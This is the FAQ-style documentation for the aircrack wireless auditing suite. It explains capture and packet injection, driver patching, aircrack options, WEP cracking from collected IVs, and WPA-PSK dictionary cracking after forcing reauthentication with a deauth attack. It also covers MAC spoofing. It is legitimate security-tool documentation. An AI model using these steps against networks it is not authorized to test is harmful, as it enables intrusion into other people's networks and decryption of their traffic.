
                            aircrack documentation

-------------------------------------------------------------------------------

What is aircrack ?

    aircrack is a set of tools for auditing wireless networks:

      + airodump: 802.11 packet capture program
      + aireplay: 802.11 packet injection program
      + aircrack: static WEP and WPA-PSK key cracker
      + airdecap: decrypts WEP/WPA capture files
    This document has been translated in spanish language (thanks to ShaKarO).

Is there an aircrack discussion forum ?

    Sure: http://100h.org/forums/. Also, check out #aircrack on
    irc.freenode.net

Where to download aircrack ?

    The official download location is http://www.cr0.net:8040/code/network/.
    However, if you can't access port 8040 for some reason, you may use this
    mirror instead: http://100h.org/wlan/aircrack/.

    Aircrack is included in the Troppix LiveCD, which features { Prism2 /
    PrismGT / Realtek / Atheros / Ralink } drivers patched for packet
    injection, as well as the acx100, ipw2200 (Centrino) and zd1211 drivers.

It says "cygwin1.dll not found" when I start aircrack.exe.

    You can download this library from: http://100h.org/wlan/aircrack/.

    To use aircrack, drag&drop your .cap or .ivs capture file(s) over
    aircrack.exe. If you want to pass options to the program you'll have to
    start a shell (cmd.exe) and manually type the command line; there is also a
    GUI for aircrack, developed by hexanium.

    Example:

    C:\TEMP> aircrack.exe -n 64 -f 8 out1.cap out2.cap ...

    See below for a list of options.

How do I crack a static WEP key ?

    The basic idea is to capture as much encrypted traffic as possible using
    airodump. Each WEP data packet has an associated 3-byte Initialization
    Vector (IV): after a sufficient number of data packets have been collected,
    run aircrack on the resulting capture file. aircrack will then perform a
    set of statistical attacks developped by a talented hacker named KoreK.

How do I know my WEP key is correct ?

    There are two authentication modes for WEP:

      + Open-System Authentication: this is the default mode. All clients are
        accepted by the AP, and the key is never checked: association is always
        granted. However if your key is incorrect you won't be able to receive
        or send packets (because decryption will fail), so DHCP, ping etc. will
        timeout.

      + Shared-Key Authentication: the client has to encrypt a challenge before
        association is granted by the AP. This mode is flawed and leads to
        keystream recovery, so it's never enabled by default.

    In summary, just because you seem to have successfully connected to the
    access point doesn't mean your WEP key is correct ! To check your WEP key,
    try to decrypt a capture file with the airdecap program.

How many IVs are required to crack WEP ?

    WEP cracking is not an exact science. The number of required IVs depends on
    the WEP key length, and it also depends on your luck. Usually, 40-bit WEP
    can be cracked with 300.000 IVs, and 104-bit WEP can be cracked with
    1.000.000 IVs; if you're out of luck you may need two million IVs, or more.

    There's no way to know the WEP key length: this information is kept hidden
    and never announced, either in management or data packets; as a
    consequence, airodump can not report the WEP key length. Thus, it is
    recommended to run aircrack twice: when you have 250.000 IVs, start
    aircrack with "-n 64" to crack 40-bit WEP. Then if the key isn't found,
    restart aircrack (without the -n option) to crack 104-bit WEP.

I can't seem to capture any IVs !

    Possible reasons:

      + You are standing too far from the access point.
      + There is no traffic on the target wireless network.
      + There is some G traffic but you're capturing in B mode.
      + Something is wrong with your card (firmware problem ?)

    By the way, beacons are just unencrypted announcement packets. They're
    totally useless for WEP cracking.

I've been unable to crack this AP !

    Shit happens.

Why is there no Windows version of aireplay ?

    The PEEK driver doesn't support 802.11 packet injection; I will not port
    aireplay on Win32. However, there are commercial alternatives:

    Prism cards: http://www.tuca-software.com/transmit.php

    Atheros cards: http://www.tamos.com/htmlhelp/commwifi/pgen.htm

Is my card compatible with airodump / aireplay ?

    First of all, search Google to find which chipset your card has. For
    example, if you have a Linksys WPC54G search for "wpc54g chipset linux".

     +----------------------------------------------------------------------+
     |             |   Supported by    |    Supported by    | Supported by  |
     |   Chipset   |   airodump for    | airodump for Linux | aireplay for  |
     |             |     Windows ?     |         ?          |    Linux ?    |
     |-------------+-------------------+--------------------+---------------|
     |             | YES (Agere driver | YES (patched       | NO (firmware  |
     | HermesI     | )                 | orinoco driver)    | corrupts the  |
     |             |                   |                    | MAC header)   |
     |-------------+-------------------+--------------------+---------------|
     |             |                   | YES (HostAP or     | YES (PCI and  |
     |             | NO, but see       | wlan-ng driver),   | CardBus only, |
     | Prism2/3    | LinkFerret for an | STA firmware 1.5.6 | driver        |
     |             | alternative       | or newer required  | patching      |
     |             |                   |                    | required)     |
     |-------------+-------------------+--------------------+---------------|
     |             |                   | FullMAC: YES (     | YES (driver   |
     | PrismGT     | YES (PrismGT      | prism54 driver,    | patching      |
     |             | driver)           | SoftMAC: NOT YET ( | recommended)  |
     |             |                   | prism54usb)        |               |
     |-------------+-------------------+--------------------+---------------|
     |             | CardBus: YES (    |                    |               |
     |             | Atheros driver),  | YES (PCI and       | YES (driver   |
     | Atheros     | PCI: NO (see      | CardBus only,      | patching      |
     |             | CommView WiFi     | madwifi driver)    | required)     |
     |             | instead)          |                    |               |
     |-------------+-------------------+--------------------+---------------|
     |             |                   | YES (              | UNSTABLE      |
     | RTL8180     | YES (Realtek      | rtl8180-sa2400     | (driver       |
     |             | driver)           | driver)            | patching      |
     |             |                   |                    | required)     |
     |-------------+-------------------+--------------------+---------------|
     |             | YES? (Cisco       | YES (airo driver,  | NO (firmware  |
     | Aironet     | driver)           | firmware 4.25.30   | issue)        |
     |             |                   | recommended)       |               |
     |-------------+-------------------+--------------------+---------------|
     |             |                   | YES (rt2500 /      | YES (driver   |
     | Ralink      | NO                | rt2570 driver)     | patching      |
     |             |                   |                    | required)     |
     |-------------+-------------------+--------------------+---------------|
     |             |                   | PARTIAL: the       |               |
     | Centrino b  | NO                | ipw2100 driver     | NO            |
     |             |                   | doesn't discard    |               |
     |             |                   | corrupted packets  |               |
     |-------------+-------------------+--------------------+---------------|
     | Centrino b/ |                   | YES (ipw2200       | NO (firmware  |
     | g           | NO                | driver, 1.0.6      | drops         |
     |             |                   | recommended)       | packets)      |
     |-------------+-------------------+--------------------+---------------|
     |             | Old models only ( | NOT YET (bcm43xx   |               |
     | Broadcom    | BRCM driver)      | driver, Linux >=   | NO            |
     |             |                   | 2.6.14 required)   |               |
     |-------------+-------------------+--------------------+---------------|
     | TI (ACX100  | NO                | UNTESTED (acx100   | NO            |
     | / ACX111)   |                   | driver)            |               |
     |-------------+-------------------+--------------------+---------------|
     | ZyDAS 1201  | NO                | YES (zd1211 driver | NO            |
     |             |                   | )                  |               |
     |-------------+-------------------+--------------------+---------------|
     | Others      | NO                | UNKNOWN            | NO            |
     | (Marvel...) |                   |                    |               |
     +----------------------------------------------------------------------+

The PEEK driver does not recognize my card.

    Some cards are not recognized by the Windows drivers above, even though
    they have the correct chipset. In this case, open the hardware manager,
    select your card, "Update the driver", select "Install from a specific
    location", select "Don't search, I will choose the driver to install",
    click "Have disk", set the path to where the driver has been unzipped,
    uncheck "Show compatible hardware", and finally choose the driver.

I have a Prism2 card, but airodump / aireplay doesn't seem to work !

    First step, make sure you aren't using the orinoco driver. If the interface
    name is wlan0, then the driver is HostAP or wlan-ng. However if the
    interface name is eth0 or eth1, then the driver is orinoco and you must
    disable the driver (use cardctl ident to know you card identifier, then
    edit /etc/pcmcia/config, replace orinoco_cs with hostap_cs and restart
    cardmgr).

    Also, it can be a firmware problem. Old firmwares have trouble with test
    mode 0x0A (used by the HostAP / wlan-ng injection patches), so make sure
    yours is up to date -- see below for instructions. The recommended station
    firmware version is 1.7.4. If it doesn't work well (kismet or airodump
    stalls after capturing a couple of packets), try STA 1.5.6 instead (either
    s1010506.hex for old Prism2 cards, or sf010506.hex for newer ones).

    On a side note, test mode 0x0A is somewhat unstable with wlan-ng. If the
    card seems stuck, you will have to reset it, or use HostAP instead.
    Injection is currently broken on Prism2 USB devices w/ wlan-ng.

    Note: a Windows XP driver for Prism2 cards with WPA/TKIP support can be
    found here: http://100h.org/wlan/winxp/wpc11v3.0_wpa_dr.exe.

I have an Atheros card, and the madwifi patch crashes the kernel /
aireplay keeps saying enhanced RTC support isn't available.

    There are quite a few problems with some versions of the Linux 2.6 branch
    (especially before 2.6.11 was released) that will cause a kernel panic when
    injecting with madwifi. Also, on many 2.6 kernels enhanced RTC support is
    just broken. Thus, is it highly recommended to use either Linux 2.6.11.x or
    newer.

How do I update my Prism2 firmware ?

    The simplest is to upgrade the firmware with WinUpdate - this requires to
    have the WPC11 driver v2.5 installed. Both can be found at: http://100h.org
    /wlan/linux/prism2/.

    You may also update the firmware with patched HostAP (see below for
    instructions on how to patch and install HostAP). Alternatively, you may
    boot the Troppix Live CD (which already has a patched hostap driver and the
    prism2_srec utility).

    Now that HostAP is loaded, you can check your firmware's primary and
    station version with this command:

    # dmesg | grep wifi
    hostap_cs: Registered netdevice wifi0
    wifi0: NIC: id=0x800c v1.0.0
    wifi0: PRI: id=0x15 v1.1.1  (primary firmware is 1.1.1)
    wifi0: STA: id=0x1f v1.7.4  (station firmware is 1.7.4)
    wifi0: registered netdevice wlan0

    If the NIC id above is between 0x8002 and 0x8008, you have an old Prism2
    and MUST use STA firmware version 1.5.6 (s1010506.hex). Otherwise, you
    should use PRI 1.1.1 / STA 1.7.4 which is the most stable firmware version
    for newer Prism2 cards. Do NOT use firmware 1.7.1 or 1.8.x, people have
    reported having trouble with them.

    To update the firmware, you'll need prism2_srec from the hostap-utils
    package; if it's not present on your system, download and compile
    hostap-utils:

    wget http://100h.org/wlan/linux/prism2/hostap-utils-0.4.0.tar.gz
    tar -xvzf hostap-utils-0.4.0.tar.gz
    cd hostap-utils-0.4.0
    make

    Some Prism2 cards have been restricted to a certain set of channels because
    of country regulation. You can activate all 14 channels with the following
    commands:

    ./prism2_srec wlan0 -D > pda; cp pda pda.bak
    Edit pda and put 3FFF at offset 0104 (line 24)

    Finally, download the firmware and flash your card. If the NIC id is
    between 0x8002 and 0x8008:

    wget http://100h.org/wlan/linux/prism2/s1010506.hex
    ./prism2_srec -v -f wlan0 s1010506.hex -P pda

    Otherwise:

    wget http://100h.org/wlan/linux/prism2/pk010101.hex
    wget http://100h.org/wlan/linux/prism2/sf010704.hex
    ./prism2_srec -v -f wlan0 pk010101.hex sf010704.hex -P pda

    If you get the message "ioctl[PRISM2_IOCTL_HOSTAPD]: Operation not
    supported", the HostAP driver is not loaded and you must install it. If you
    get the message "ioctl[PRISM2_IOCTL_DOWNLOAD]: Operation not supported",
    then your HostAP driver has not been patched for non-volatile download
    support.

Which is the best card to buy ?

    The best chipset nowadays is Atheros; it is very well supported under
    Linux, and also under Windows (PCMCIA/CardBus only). The latest madwifi
    patch makes it possible to inject raw 802.11 packets either in Managed and
    Monitor mode at arbitrary b/g speeds.

    Ralink makes some nice b/g chipsets, and has been very cooperative with the
    open-source community to release GPL drivers. Packet injection is now fully
    supported under Linux on PCI/CardBus RT2500 cards, and also works on USB
    RT2570 devices.

    Here's a list of recommended cards:

     +----------------------------------------------------------------------+
     |   Card   |  Type   | Chipset | Antenna  | Price | Windows  |  Linux  |
     |   name   |         |         |          |       | support  | support |
     |----------+---------+---------+----------+-------+----------+---------|
     | MSI      | PCI     | Ralink  | RP-SMA   | E30   | No       | Yes     |
     | PC54G2   |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | MSI      | CardBus | Ralink  | Internal | E30   | No       | Yes     |
     | CB54G2   |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Linksys  |         |         |          |       |          |         |
     | WMP54G   | PCI     | Ralink  | RP-SMA   | E40   | No       | Yes     |
     | v4       |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Linksys  |         |         |          |       |          |         |
     | WUSB54G  | USB     | Ralink  | Internal | E40   | No       | Yes     |
     | v4       |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | D-Link   | USB     | Ralink  | Internal | E45   | No       | Yes     |
     | DWL-G122 |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Netgear  | USB     | PrismGT | Internal | E40   | airodump | No      |
     | WG111    |         | SoftMAC |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Netgear  | PCI     | Atheros | RP-SMA   | E50   | CommView | Yes     |
     | WG311T   |         |         |          |       | WiFi     |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Netgear  | CardBus | Atheros | Internal | E50   | airodump | Yes     |
     | WG511T   |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Netgear  | CardBus | Atheros | Internal | E100  | airodump | Yes     |
     | WAG511   |         |         |          |       |          |         |
     |----------+---------+---------+----------+-------+----------+---------|
     | Proxim   | CardBus | Atheros | MC +     | E110  | airodump | Yes     |
     | 8470-WD  |         |         | Int.     |       |          |         |
     +----------------------------------------------------------------------+

    Note: there are some cheaper models with a similar name (WG511, WG311 and
    DWL-G520+); those cards are not Atheros-based. Also, the Peek driver does
    not support recent Atheros cards, so you'll have to use CommView WiFi
    instead.

How do I use airodump for Windows ?

    First of all, make sure that your card is compatible (see table above) and
    that you have installed the proper driver.

    When running airodump, you should specify:

      + The network interface index number, which must be picked in the list
        displayed by airodump.
      + The network interface type ('o' for HermesI and Realtek, 'a' for
        Aironet, Atheros, Broadcom and PrismGT).
      + The channel number, between 1 and 14. You can also specify 0 to hop
        between all channels.
      + The output prefix. For example, if the prefix is "foo", then airodump
        will create foo.cap (captured packets) and foo.txt (CSV statistics). If
        foo.cap already exists, airodump will resume the capture session by
        appending the packets to it.
      + The "only IVs" flag. Specify 1 if you just want to save the IVs from
        WEP data packets. This saves space, but the resulting file (foo.ivs)
        will only be useful for WEP cracking.

    To stop capturing packets, press Ctrl-C. You may get a blue screen, this is
    due to a bug in the PEEK driver not cleanly exiting monitor mode. Also, the
    capture file may be empty. The cause of this bug is unknown.

Why can't I compile airodump and aireplay on BSD / Mac OS X ?

    Both airodump and aireplay sources are linux-specific. There are no plans
    to port them on any other operating system.

How do I use airodump for Linux ?

    Before running airodump, you may start the airmon.sh script to list the
    detected wireless interfaces. It is possible, but not recommended, to run
    Kismet and airodump at the same time.

      usage: airodump <interface> <output prefix> [channel] [IVs flag]

      Specify 0 as the channel to hop between 2.4 GHz channels.
      Set the optional IVs flag to 1 to only save the captured
      IVs - the resulting file is only useful for WEP cracking.

      If the gpsd daemon is running, airodump will retrieve and
      save the current GPS coordinates in text format.

    You can convert a .cap / .dump file to .ivs format with the pcap2ivs
    program (linux only).

airodump keeps switching between WEP and WPA.

    This is happening because your driver doesn't discard corrupted packets
    (that have an invalid CRC). If it's a Centrino b, it just can't be helped;
    go buy a better card. If it's a Prism2, try upgrading the firmware.

What's the meaning of the fields displayed by airodump ?

    airodump will display a list of detected access points, and also a list of
    connected clients ("stations"). Here's an example screenshot using a Prism2
    card with HostAP:

      +--------------------------------------------------------------------+
      |  BSSID              PWR  Beacons   # Data  CH  MB  ENC   ESSID     |
      |                                                                    |
      |  00:13:10:30:24:9C   46       15     3416   6  54. WEP   the ssid  |
      |  00:09:5B:1F:44:10   36       54        0  11  11  OPN   NETGEAR   |
      |                                                                    |
      |  BSSID              STATION            PWR  Packets  Probes        |
      |                                                                    |
      |  00:13:10:30:24:9C  00:09:5B:EB:C5:2B   48      719  the ssid      |
      |  00:13:10:30:24:9C  00:02:2D:C1:5D:1F  190       17  the ssid      |
      |                                                                    |
      +--------------------------------------------------------------------+

     +----------------------------------------------------------------------+
     |  Field  |                        Description                         |
     |---------+------------------------------------------------------------|
     | BSSID   | MAC address of the access point.                           |
     |---------+------------------------------------------------------------|
     |         | Signal level reported by the card. Its signification       |
     | PWR     | depends on the driver, but as the signal gets higher you   |
     |         | get closer to the AP or the station. If PWR == -1, the     |
     |         | driver doesn't support signal level reporting.             |
     |---------+------------------------------------------------------------|
     |         | Number of announcements packets sent by the AP. Each       |
     | Beacons | access point sends about ten beacons per second at the     |
     |         | lowest rate (1M), so they can usually be picked up from    |
     |         | very far.                                                  |
     |---------+------------------------------------------------------------|
     | # Data  | Number of captured data packets (if WEP, unique IV count), |
     |         | including data broadcast packets.                          |
     |---------+------------------------------------------------------------|
     |         | Channel number (taken from beacon packets). Note:          |
     | CH      | sometimes packets from other channels are captured even if |
     |         | airodump is not hopping, because of radio interference.    |
     |---------+------------------------------------------------------------|
     |         | Maximum speed supported by the AP. If MB = 11, it's        |
     | MB      | 802.11b, if MB = 22 it's 802.11b+ and higher rates are     |
     |         | 802.11g. The dot (after 54 above) indicates short preamble |
     |         | is supported.                                              |
     |---------+------------------------------------------------------------|
     |         | Encryption algorithm in use. OPN = no encryption, "WEP?" = |
     | ENC     | WEP or higher (not enough data to choose between WEP and   |
     |         | WPA), WEP (without the question mark) indicates static or  |
     |         | dynamic WEP, and WPA if TKIP or CCMP is present.           |
     |---------+------------------------------------------------------------|
     |         | The so-called "SSID", which can be empty if SSID hiding is |
     | ESSID   | activated. In this case, airodump will try to recover the  |
     |         | SSID from probe responses and association requests.        |
     |---------+------------------------------------------------------------|
     |         | MAC address of each associated station. In the screenshot  |
     | STATION | above, two clients have been detected (00:09:5B:EB:C5:2B   |
     |         | and 00:02:2D:C1:5D:1F).                                    |
     +----------------------------------------------------------------------+

How do I merge multiple capture files ?

    You may use the mergecap program (part of the ethereal-common package or
    the win32 distribution):

    mergecap -w out.cap test1.cap test2.cap test3.cap

    .ivs files can be merged with the "mergeivs" program (linux only).

Can I use Ethereal to capture 802.11 packets ?

    Under Linux, simply setup the card in monitor mode with the airmon.sh
    script. Under Windows, Ethereal can NOT capture 802.11 packets.

Can Ethereal decode WEP data packets ?

    Yes. Go to Edit -> Preferences -> Protocols -> IEEE 802.11, select 1 in the
    "WEP key count" and enter your WEP key below.

How do I change my card's MAC address ?

    Under linux: for example, if you have an Atheros card:

    ifconfig ath0 down
    ifconfig ath0 hw ether 00:11:22:33:44:55
    ifconfig ath0 up

    Under Windows, you may use macmakeup.

How do I use aircrack ?

    Usage: aircrack [options] <capture file(s)>

    You can specify multiple input files (either in .cap or .ivs format). Also,
    you can run both airodump and aircrack at the same time: aircrack will
    auto-update when new IVs are available.

    Here's a summary of all available options:

     +----------------------------------------------------------------------+
     | Option | Param. |                    Description                     |
     |--------+--------+----------------------------------------------------|
     | -a     | amode  | Force attack mode (1 = static WEP, 2 = WPA-PSK).   |
     |--------+--------+----------------------------------------------------|
     |        |        | If set, all IVs from networks with the same ESSID  |
     | -e     | essid  | will be used. This option is also required for     |
     |        |        | WPA-PSK cracking if the ESSID is not broadcasted   |
     |        |        | (hidden).                                          |
     |--------+--------+----------------------------------------------------|
     | -b     | bssid  | Select the target network based on the access      |
     |        |        | point's MAC address.                               |
     |--------+--------+----------------------------------------------------|
     | -p     | nbcpu  | On SMP systems, set this option to the number of   |
     |        |        | CPUs.                                              |
     |--------+--------+----------------------------------------------------|
     | -q     | none   | Enable quiet mode (no status output until the key  |
     |        |        | is found, or not).                                 |
     |--------+--------+----------------------------------------------------|
     | -c     | none   | (WEP cracking) Restrict the search space to        |
     |        |        | alpha-numeric characters only (0x20 - 0x7F).       |
     |--------+--------+----------------------------------------------------|
     | -t     | none   | (WEP cracking) Restrict the search space to binary |
     |        |        | coded decimal hex characters.                      |
     |--------+--------+----------------------------------------------------|
     | -d     | start  | (WEP cracking) Set the beginning the WEP key (in   |
     |        |        | hex), for debugging purposes.                      |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) MAC address to filter WEP data      |
     | -m     | maddr  | packets. Alternatively, specify -m                 |
     |        |        | ff:ff:ff:ff:ff:ff to use all and every IVs,        |
     |        |        | regardless of the network.                         |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) Specify the length of the key: 64   |
     | -n     | nbits  | for 40-bit WEP, 128 for 104-bit WEP, etc. The      |
     |        |        | default value is 128.                              |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) Only keep the IVs that have this    |
     | -i     | index  | key index (1 to 4). The default behaviour is to    |
     |        |        | ignore the key index.                              |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) By default, this parameter is set   |
     |        |        | to 2 for 104-bit WEP and to 5 for 40-bit WEP.      |
     | -f     | fudge  | Specify a higher value to increase the bruteforce  |
     |        |        | level: cracking will take more time, but with a    |
     |        |        | higher likelyhood of success.                      |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) There are 17 korek statistical      |
     |        |        | attacks. Sometimes one attack creates a huge false |
     | -k     | korek  | positive that prevents the key from being found,   |
     |        |        | even with lots of IVs. Try -k 1, -k 2, ... -k 17   |
     |        |        | to disable each attack selectively.                |
     |--------+--------+----------------------------------------------------|
     | -x     | none   | (WEP cracking) Enable bruteforcing of the last two |
     |        |        | keybytes.                                          |
     |--------+--------+----------------------------------------------------|
     |        |        | (WEP cracking) This is an experimental single      |
     | -y     | none   | bruteforce attack which should only be used when   |
     |        |        | the standard attack mode fails with more than one  |
     |        |        | million IVs.                                       |
     |--------+--------+----------------------------------------------------|
     | -w     | words  | (WPA cracking) Path to a wordlist.                 |
     +----------------------------------------------------------------------+

Could you implement a resume option in aircrack ?

    There are no plans to implement this feature.

How can I crack a WPA-PSK network ?

    You must sniff until a handshake takes place between a wireless client and
    the access point. To force the client to reauthenticate, you can start a
    deauth attack with aireplay. Also, a good dictionary is required; see
    http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists/

    FYI, it's not possible to pre-compute large tables of Pairwise Master Keys
    like rainbowcrack does, since the passphrase is salted with the ESSID.

Will WPA be cracked in the future ?

    It's extremely unlikely that WPA will be cracked just like WEP was.

    The major problem with WEP is that the shared key is appended to the IV;
    the result is directly used to feed RC4. This overly simple construction is
    prone to a statistical attack, since the first ciphertext bytes are
    strongly correlated with the shared key (see Andrew Roos' paper). There are
    basically two counter-measures against this attack: 1. mix the IV and the
    shared key using a hash function or 2. discard the first 256 bytes of RC4's
    output.

    There has been some disinformation in the news about the "flaws" of TKIP:

        For now, TKIP is reasonably secure but it is also living on borrowed
        time since it still relies on the same RC4 algorithm that WEP relied
        on.

    Actually, TKIP (WPA1) is not vulnerable: for each packet, the 48-bit IV is
    mixed with the 128-bit pairwise temporal key to create a 104-bit RC4 key,
    so there's no statistical correlation at all. Furthermore, WPA provides
    counter-measures against active attacks (traffic reinjection), includes a
    stronger message integrity code (michael), and has a very robust
    authentication protocol (the 4-way handshake). The only vulnerability so
    far is a dictionnary attack, which fails if the passphrase is robust
    enough.

    WPA2 (aka 802.11i) is exactly the same as WPA1, except that CCMP (AES in
    counter mode) is used instead of RC4 and HMAC-SHA1 is used instead of
    HMAC-MD5 for the EAPOL MIC. Bottom line, WPA2 is a bit better than WPA1,
    but neither are going to be cracked in the near future.

I have more than one million IVs, but aircrack doesn't find the key !

    Possible reasons:

      + Out of luck: you must capture more IVs. Usually, 104-bit WEP can be
        cracked with about one million IVs, but sometimes more IVs are needed.
         
      + If all votes seem equal, or if there are many negative votes, then the
        capture file is corrupted, or the key is not static (EAP/802.1X in use
        ?).
         
      + A false positive prevented the key from being found. Try to disable
        each korek attack (-k 1 .. 17), raise the fudge factor (-f) or try the
        experimental bruteforce attacks (-x / -y).

I've found the key, how do I decrypt a capture file ?

    You may use the airdecap program:

      usage: airdecap [options] <pcap file>

          -l       : don't remove the 802.11 header
          -b bssid : access point MAC address filter
          -k pmk   : WPA Pairwise Master Key in hex
          -e essid : target network ascii identifier
          -p pass  : target network WPA passphrase
          -w key   : target network WEP key in hex

      examples:

      airdecap -b 00:09:5B:10:BC:5A open-network.cap
      airdecap -w 11A3E229084349BC25D97E2939 wep.cap
      airdecap -e 'the ssid' -p passphrase  tkip.cap


How do I recover my WEP key in Windows ?

    You may use the WZCOOK program which recovers WEP keys from XP's Wireless
    Zero Configuration utility. This is experimental software, so it may or may
    not work depending on your service pack level.

Does WZCOOK also recovers WPA keys ?

    WZCOOK will display the PMK (Pairwise Master Key), a 256-bit value which is
    the result of the passphrase hashed 8192 times together with the ESSID and
    the ESSID length. The passphrase itself can't be recovered -- however,
    knowing the PMK is enough to connect to a WPA-protected wireless network
    with wpa_supplicant (see the Windows README). Your wpa_supplicant.conf
    configuration file should look like:

    network={
        ssid="my_essid"
        pmk=5c9597f3c8245907ea71a89d[...]9d39d08e
    }

How do I patch the driver for injection with aireplay ?

    As of now, aireplay only supports injection on Prism2, PrismGT (FullMAC),
    Atheros, RTL8180 and Ralink. Injection on Centrino, Hermes, ACX1xx,
    Aironet, ZyDAS, Marvell and Broadcom is not supported because of firmware
    and/or driver limitations.

    Injection on Prism2 and Atheros is still pretty much experimental; if your
    card appears to hang (no packets captured or injected), disable the
    interface, reload the drivers and re-insert the card. Also consider
    updating the firmware (if Prism2).

    All drivers must be patched so as to support injection in Monitor mode. You
    will need linux headers that match your current running kernel; if not, you
    will have to download the linux source and compile a custom kernel.

    If you have trouble patching and compiling stuff, you may want to use the
    Troppix LiveCD, which includes patched device drivers.

      + Installing the madwifi driver (Atheros cards)

        Note 1: you'll need uudecode from the sharutils package.

        Note 2: the 20051025 patch should also work with newer version of the
        madwifi CVS.

        Note 3: if you use wpa_supplicant, you should recompile it (older
        versions are not compatible with the current madwifi CVS), and make
        sure CONFIG_DRIVER_MADWIFI=y is uncommented in config.h.

        Note 4: with the current madwifi, it is no longer needed to run "iwpriv
        ath0 mode 2", since the driver allows injection in mode 0 using the new
        athXraw interface.

                         +-----------------------------------+
                         | Allowed modes |  Physical medium  |
                         |---------------+-------------------|
                         | Mode 0        | Automatic (a/b/g) |
                         |---------------+-------------------|
                         | Mode 1        | 802.11a only      |
                         |---------------+-------------------|
                         | Mode 2        | 802.11b only      |
                         |---------------+-------------------|
                         | Mode 3        | 802.11g only      |
                         +-----------------------------------+

        ifconfig ath0 down
        rmmod wlan_wep ath_rate_sample ath_rate_onoe \
              ath_pci wlan ath_hal 2>/dev/null

        find /lib/modules -name 'ath*'  -exec rm -v {} \; 2>/dev/null
        find /lib/modules -name 'wlan*' -exec rm -v {} \; 2>/dev/null
        cd /usr/src
        wget http://100h.org/wlan/linux/atheros/madwifi-cvs-20051025.tgz
        wget http://100h.org/wlan/linux/patches/madwifi-cvs-20051025.patch
        tar -xvzf madwifi-cvs-20051025.tgz
        cd madwifi-cvs-20051025
        patch -Np1 -i ../madwifi-cvs-20051025.patch
        make KERNELPATH=/usr/src/linux-<insert version>
        make install
        modprobe ath_pci

        It is now possible to set the transmit rate with madwifi (and also
        rt2570). The recommended rate is 5.5 Mbps, but you can lower it or
        raise it, depending on your distance from the AP. For example:

        iwconfig ath0 rate 24M

                   +----------------------------------------------+
                   | Modulation |          Allowed rates          |
                   |------------+---------------------------------|
                   | DSSS / CCK | 1M, 2M, 5.5M, 11M               |
                   |------------+---------------------------------|
                   | OFDM (a/g) | 6M, 9M, 12M, 24M, 36M, 48M, 54M |
                   +----------------------------------------------+

        When using attacks 2, 3 and 4, changing the number of packets per
        second sent by aireplay (option -x) sometimes helps getting better
        results; the default is 500 pps.

      + Installing the prism54 driver (PrismGT FullMAC cards)

        ifconfig eth1 down
        rmmod prism54

        cd /usr/src
        wget http://100h.org/wlan/linux/prismgt/prism54-svn-20050724.tgz
        wget http://100h.org/wlan/linux/patches/prism54-svn-20050724.patch
        tar -xvzf prism54-svn-20050724.tgz
        cd prism54-svn-20050724
        patch -Np1 -i ../prism54-svn-20050724.patch
        make modules && make install
        wget http://100h.org/wlan/linux/prismgt/1.0.4.3.arm
        mkdir -p /usr/lib/hotplug/firmware
        mkdir -p /lib/firmware
        cp 1.0.4.3.arm /usr/lib/hotplug/firmware/isl3890
        mv 1.0.4.3.arm /lib/firmware/isl3890
        depmod -a

      + Installing the HostAP driver (Prism2 cards)

        ifconfig wlan0 down
        wlanctl-ng wlan0 lnxreq_ifstate ifstate=disable
        /etc/init.d/CardBus stop
        rmmod prism2_pci
        rmmod hostap_pci

        cd /usr/src
        wget http://100h.org/wlan/linux/prism2/hostap-driver-0.4.5.tar.gz
        wget http://100h.org/wlan/linux/patches/hostap-driver-0.3.9.patch
        tar -xvzf hostap-driver-0.4.5.tar.gz
        cd hostap-driver-0.4.5
        patch -Np1 -i ../hostap-driver-0.3.9.patch
        make && make install
        mv -f /etc/pcmcia/wlan-ng.conf /etc/pcmcia/wlan-ng.conf~
        /etc/init.d/pcmcia start
        modprobe hostap_pci &>/dev/null

      + Installing the wlan-ng driver (Prism2 cards)

        Important note: when the card is inserted, wlan-ng will flash the
        firmware in RAM (volatile download) with versions PRI 1.1.4 and STA
        1.8.3. Many users experienced problems with this operation, so in any
        case it's safer to just use hostap instead. Furthermore, HostAP works
        more reliably and supports iwconfig whereas wlan-ng doesn't.

        ifconfig wlan0 down
        wlanctl-ng wlan0 lnxreq_ifstate ifstate=disable
        /etc/init.d/pcmcia stop
        rmmod prism2_pci
        rmmod hostap_pci
        find /lib/modules \( -name p80211* -o -name prism2* \) \
            -exec rm -v {} \;

        cd /usr/src
        wget http://100h.org/wlan/linux/prism2/wlanng-0.2.1-pre26.tar.gz
        wget http://100h.org/wlan/linux/patches/wlanng-0.2.1-pre26.patch
        tar -xvzf wlanng-0.2.1-pre26.tar.gz
        cd wlanng-0.2.1-pre26
        patch -Np1 -i ../wlanng-0.2.1-pre26.patch
        make config && make all && make install
        mv /etc/pcmcia/hostap_cs.conf /etc/pcmcia/hostap_cs.conf~
        /etc/init.d/pcmcia start
        modprobe prism2_pci &>/dev/null

      + Installing the r8180-sa2400 driver (RTL8180 cards)

        ifconfig wlan0 down
        rmmod r8180

        cd /usr/src
        wget http://100h.org/wlan/linux/rtl8180/rtl8180-0.21.tar.gz
        wget http://100h.org/wlan/linux/patches/rtl8180-0.21.patch
        tar -xvzf rtl8180-0.21.tar.gz
        cd rtl8180-0.21
        patch -Np1 -i ../rtl8180-0.21.patch
        make && make install
        depmod -a
        modprobe r8180

      + Installing the rt2500 driver (Ralink b/g PCI/CardBus)

        ifconfig ra0 down
        rmmod rt2500

        cd /usr/src
        wget http://100h.org/wlan/linux/ralink/rt2500-cvs-20051112.tgz
        tar -xvzf rt2500-cvs-20051112.tgz
        cd rt2500-cvs-20051112
        cd Module
        make && make install
        modprobe rt2500

        Make sure to load the driver with modprobe (not insmod) and to put the
        card in Monitor mode before bringing the interface up.

